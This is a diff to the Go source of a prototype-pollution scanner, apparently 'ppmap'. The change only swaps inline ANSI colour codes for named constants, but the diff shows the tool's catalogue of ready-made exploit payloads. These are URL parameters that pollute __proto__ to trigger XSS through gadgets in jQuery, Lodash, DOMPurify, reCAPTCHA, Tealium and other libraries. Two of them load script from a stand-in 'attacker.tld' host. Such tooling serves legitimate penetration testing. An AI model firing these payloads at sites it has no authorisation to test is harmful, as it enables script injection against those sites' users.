@@ -9,6 +9,14 @@ import (
     "time"
 )
 
+//some fancy colour variables here
+const (
+        Info    = "[\033[33mINFO\033[0m]"
+        Vulnerable = "[\033[32mVULN\033[0m]"
+        Error   = "[\033[31mERRO\033[0m]"
+        Exploit   = "[\033[34mEXPL\033[0m]"
+)
+
 var fingerprint string = `(() => {
   let gadgets = 'default';
   if (typeof _satellite !== 'undefined') {
@@ -96,7 +104,7 @@ func main() {
     dMMMMb  dMMMMb  dMMMMMMMMb  .aMMMb  dMMMMb     v1.0.1
    dMP.dMP dMP.dMP dMP"dMP"dMP dMP"dMP dMP.dMP 
   dMMMMP" dMMMMP" dMP dMP dMP dMMMMMP dMMMMP"  
- dMP     dMP     dMP dMP dMP dMP dMP dMP       
+ dMP     dMP     dMP dMP dMP dMP dMP dMP           
 dMP     dMP     dMP dMP dMP dMP dMP dMP            @kleiton0x7e
 
                                      
@@ -137,14 +145,14 @@ dMP     dMP     dMP dMP dMP dMP dMP dMP            @kleiton0x7e
                 chromedp.Evaluate(`window.ppmap`, &res),
             )
             if err != nil {
-                log.Printf("[\033[31mERRO\033[0m] %s", url)
+                log.Printf(Error + " %s", url)
                 continue
             }
 
-            log.Printf("[\033[32mVULN\033[0m] %s", url)
+            log.Printf(Vulnerable + " %s", url)
             time.Sleep(1 * time.Second)
             //now its fingerprinting time
-            log.Printf("[\033[33mINFO\033[0m] Fingerprinting the gadget...")
+            log.Printf(Info + " Fingerprinting the gadget...")
             time.Sleep(3 * time.Second)
             var res1 string
             err1 := chromedp.Run(ctx,
@@ -155,7 +163,7 @@ dMP     dMP     dMP dMP dMP dMP dMP dMP            @kleiton0x7e
                 log.Fatal(err1)
             }
                 
-            log.Printf("[\033[33mINFO\033[0m] Gadget found: " + string(res1))
+            log.Printf(Info + " Gadget found: " + string(res1))
             time.Sleep(2 * time.Second)
                 
             result1 := strings.Contains(string(res1), "Adobe Dynamic Tag Management")
@@ -181,81 +189,81 @@ dMP     dMP     dMP dMP dMP dMP dMP dMP            @kleiton0x7e
         
                 
             if result20 == true { //undefined
-               log.Printf("[\033[31mERRO\033[0m] No gadget found") 
-               log.Printf("[\033[33mINFO\033[0m] Website is vulnerable to Prototype Pollution, but not automatically exploitable")
+               log.Printf(Error + " No gadget found") 
+               log.Printf(Info + " Website is vulnerable to Prototype Pollution, but not automatically exploitable")
                 
             } else if result1 == true { //Adobe Dynamic
-               log.Printf("[\033[34mEXPL\033[0m] Final payload: " + string(u) + string(quote) + "__proto__[src]=data:,alert(1)//") 
+               log.Printf(Exploit + " Final payload: " + string(u) + string(quote) + "__proto__[src]=data:,alert(1)//") 
                 
             } else if result2 == true { //Akamai Boomerang
-               log.Printf("[\033[34mEXPL\033[0m] Final payload: " + string(u) + string(quote) + "__proto__[BOOMR]=1&__proto__[url]=//attacker.tld/js.js") 
+               log.Printf(Exploit + " Final payload: " + string(u) + string(quote) + "__proto__[BOOMR]=1&__proto__[url]=//attacker.tld/js.js") 
                 
             } else if result3 == true { //Closure
-               log.Printf("[\033[33mINFO\033[0m] Displaying all possible payloads")
-               log.Printf("[\033[34mEXPL\033[0m] Final payload: " + string(u) + string(quote) + "__proto__[*%%20ONERROR]=1&__proto__[*%20SRC]=1") 
-               log.Printf("[\033[34mEXPL\033[0m] Final payload: " + string(u) + string(quote) + "__proto__[CLOSURE_BASE_PATH]=data:,alert(1)//")
+               log.Printf(Info + " Displaying all possible payloads")
+               log.Printf(Exploit + " Final payload: " + string(u) + string(quote) + "__proto__[*%%20ONERROR]=1&__proto__[*%20SRC]=1") 
+               log.Printf(Exploit + " Final payload: " + string(u) + string(quote) + "__proto__[CLOSURE_BASE_PATH]=data:,alert(1)//")
                 
             } else if result4 == true { //DOMPurify
-               log.Printf("[\033[33mINFO\033[0m] Displaying all possible payloads")
-               log.Printf("[\033[34mEXPL\033[0m] Final payload: " + string(u) + string(quote) + "__proto__[ALLOWED_ATTR][0]=onerror&__proto__[ALLOWED_ATTR][1]=src") 
-           log.Printf("[\033[34mEXPL\033[0m] Final payload: " + string(u) + string(quote) + "__proto__[documentMode]=9")
+               log.Printf(Info + " Displaying all possible payloads")
+               log.Printf(Exploit + " Final payload: " + string(u) + string(quote) + "__proto__[ALLOWED_ATTR][0]=onerror&__proto__[ALLOWED_ATTR][1]=src") 
+           log.Printf(Exploit + " Final payload: " + string(u) + string(quote) + "__proto__[documentMode]=9")
                
             } else if result5 == true { //Embedly Cards
-               log.Printf("[\033[34mEXPL\033[0m] Final payload: " + string(u) + string(quote) + "__proto__[onload]=alert(1)") 
+               log.Printf(Exploit + " Final payload: " + string(u) + string(quote) + "__proto__[onload]=alert(1)") 
                 
             } else if result6 == true { //jQuery
-               log.Printf("[\033[33mINFO\033[0m] Displaying all possible payloads")
-               log.Printf("[\033[34mEXPL\033[0m] Final payload: " + string(u) + string(quote) + "__proto__[context]=<img/src/onerror%%3dalert(1)>&__proto__[jquery]=x")
-               log.Printf("[\033[34mEXPL\033[0m] Final payload: " + string(u) + string(quote) + "__proto__[url][]=data:,alert(1)//&__proto__[dataType]=script")
-               log.Printf("[\033[34mEXPL\033[0m] Final payload: " + string(u) + string(quote) + "__proto__[url]=data:,alert(1)//&__proto__[dataType]=script&__proto__[crossDomain]=")
-               log.Printf("[\033[34mEXPL\033[0m] Final payload: " + string(u) + string(quote) + "__proto__[src][]=data:,alert(1)//")
-               log.Printf("[\033[34mEXPL\033[0m] Final payload: " + string(u) + string(quote) + "__proto__[url]=data:,alert(1)//")
-               log.Printf("[\033[34mEXPL\033[0m] Final payload: " + string(u) + string(quote) + "__proto__[div][0]=1&__proto__[div][1]=<img/src/onerror%%3dalert(1)>&__proto__[div][2]=1")
-               log.Printf("[\033[34mEXPL\033[0m] Final payload: " + string(u) + string(quote) + "__proto__[preventDefault]=x&__proto__[handleObj]=x&__proto__[delegateTarget]=<img/src/onerror%3dalert(1)>")
+               log.Printf(Info + " Displaying all possible payloads")
+               log.Printf(Exploit + " Final payload: " + string(u) + string(quote) + "__proto__[context]=<img/src/onerror%%3dalert(1)>&__proto__[jquery]=x")
+               log.Printf(Exploit + " Final payload: " + string(u) + string(quote) + "__proto__[url][]=data:,alert(1)//&__proto__[dataType]=script")
+               log.Printf(Exploit + " Final payload: " + string(u) + string(quote) + "__proto__[url]=data:,alert(1)//&__proto__[dataType]=script&__proto__[crossDomain]=")
+               log.Printf(Exploit + " Final payload: " + string(u) + string(quote) + "__proto__[src][]=data:,alert(1)//")
+               log.Printf(Exploit + " Final payload: " + string(u) + string(quote) + "__proto__[url]=data:,alert(1)//")
+               log.Printf(Exploit + " Final payload: " + string(u) + string(quote) + "__proto__[div][0]=1&__proto__[div][1]=<img/src/onerror%%3dalert(1)>&__proto__[div][2]=1")
+               log.Printf(Exploit + " Final payload: " + string(u) + string(quote) + "__proto__[preventDefault]=x&__proto__[handleObj]=x&__proto__[delegateTarget]=<img/src/onerror%3dalert(1)>")
                 
            } else if result7 == true { //js-xss
-               log.Printf("[\033[34mEXPL\033[0m] Final payload: " + string(u) + string(quote) + "__proto__[whiteList][img][0]=onerror&__proto__[whiteList][img][1]=src") 
+               log.Printf(Exploit + " Final payload: " + string(u) + string(quote) + "__proto__[whiteList][img][0]=onerror&__proto__[whiteList][img][1]=src") 
                 
            } else if result8 == true { //Knockout.js
-               log.Printf("[\033[34mEXPL\033[0m] Final payload: " + string(u) + string(quote) + "__proto__[4]=a':1,[alert(1)]:1,'b&__proto__[5]=,") 
+               log.Printf(Exploit + " Final payload: " + string(u) + string(quote) + "__proto__[4]=a':1,[alert(1)]:1,'b&__proto__[5]=,") 
                 
            } else if result9 == true { //Lodash <= 4.17.15
-               log.Printf("[\033[34mEXPL\033[0m] Final payload: " + string(u) + string(quote) + "__proto__[sourceURL]=%%E2%80%A8%%E2%80%A9alert(1)") 
+               log.Printf(Exploit + " Final payload: " + string(u) + string(quote) + "__proto__[sourceURL]=%%E2%80%A8%%E2%80%A9alert(1)") 
                 
            } else if result10 == true { //Marionette.js / Backbone.js
-               log.Printf("[\033[34mEXPL\033[0m] Final payload: " + string(u) + string(quote) + "__proto__[tagName]=img&__proto__[src][]=x:&__proto__[onerror][]=alert(1)") 
+               log.Printf(Exploit + " Final payload: " + string(u) + string(quote) + "__proto__[tagName]=img&__proto__[src][]=x:&__proto__[onerror][]=alert(1)") 
                 
            } else if result11 == true { //Google reCAPTCHA
-               log.Printf("[\033[34mEXPL\033[0m] Final payload: " + string(u) + string(quote) + "__proto__[srcdoc][]=<script>alert(1)</script>") 
+               log.Printf(Exploit + " Final payload: " + string(u) + string(quote) + "__proto__[srcdoc][]=<script>alert(1)</script>") 
                 
            } else if result12 == true { //sanitize-html
-               log.Printf("[\033[33mINFO\033[0m] Displaying all possible payloads")
-               log.Printf("[\033[34mEXPL\033[0m] Final payload: " + string(u) + string(quote) + "__proto__[*][]=onload")
-               log.Printf("[\033[34mEXPL\033[0m] Final payload: " + string(u) + string(quote) + "__proto__[innerText]=<script>alert(1)</script>") 
+               log.Printf(Info + " Displaying all possible payloads")
+               log.Printf(Exploit + " Final payload: " + string(u) + string(quote) + "__proto__[*][]=onload")
+               log.Printf(Exploit + " Final payload: " + string(u) + string(quote) + "__proto__[innerText]=<script>alert(1)</script>") 
                 
            } else if result13 == true { //Segment Analytics.js
-               log.Printf("[\033[34mEXPL\033[0m] Final payload: " + string(u) + string(quote) + "__proto__[script][0]=1&__proto__[script][1]=<img/src/onerror%%3dalert(1)>&__proto__[script][2]=1") 
+               log.Printf(Exploit + " Final payload: " + string(u) + string(quote) + "__proto__[script][0]=1&__proto__[script][1]=<img/src/onerror%%3dalert(1)>&__proto__[script][2]=1") 
                 
            } else if result14 == true { //Sprint.js
-               log.Printf("[\033[34mEXPL\033[0m] Final payload: " + string(u) + string(quote) + "__proto__[div][intro]=<img%%20src%%20onerror%%3dalert(1)>") 
+               log.Printf(Exploit + " Final payload: " + string(u) + string(quote) + "__proto__[div][intro]=<img%%20src%%20onerror%%3dalert(1)>") 
                 
            } else if result15 == true { //Swiftype Site Search
-               log.Printf("[\033[34mEXPL\033[0m] Final payload: " + string(u) + string(quote) + "__proto__[xxx]=alert(1)") 
+               log.Printf(Exploit + " Final payload: " + string(u) + string(quote) + "__proto__[xxx]=alert(1)") 
                 
            } else if result16 == true { //Tealium Universal Tag
-               log.Printf("[\033[34mEXPL\033[0m] Final payload: " + string(u) + string(quote) + "__proto__[attrs][src]=1&__proto__[src]=//attacker.tld/js.js") 
+               log.Printf(Exploit + " Final payload: " + string(u) + string(quote) + "__proto__[attrs][src]=1&__proto__[src]=//attacker.tld/js.js") 
                 
            } else if result17 == true { //Twitter Universal Website Tag
-               log.Printf("[\033[34mEXPL\033[0m] Final payload: " + string(u) + string(quote) + "__proto__[attrs][src]=1&__proto__[hif][]=javascript:alert(1)") 
+               log.Printf(Exploit + " Final payload: " + string(u) + string(quote) + "__proto__[attrs][src]=1&__proto__[hif][]=javascript:alert(1)") 
                 
            } else if result18 == true { //Wistia Embedded Video
-               log.Printf("[\033[34mEXPL\033[0m] Final payload: " + string(u) + string(quote) + "__proto__[innerHTML]=<img/src/onerror=alert(1)>") 
+               log.Printf(Exploit + " Final payload: " + string(u) + string(quote) + "__proto__[innerHTML]=<img/src/onerror=alert(1)>") 
                 
            } else if result19 == true { //Zepto.js
-               log.Printf("[\033[34mEXPL\033[0m] Final payload: " + string(u) + string(quote) + "__proto__[onerror]=alert(1)") 
+               log.Printf(Exploit + " Final payload: " + string(u) + string(quote) + "__proto__[onerror]=alert(1)") 
                 
            } else {
-               log.Printf("[\033[31mERRO\033[0m] An unexcepted error occured")
+               log.Printf(Error + " An unexcepted error occured")
            }
                 
            break
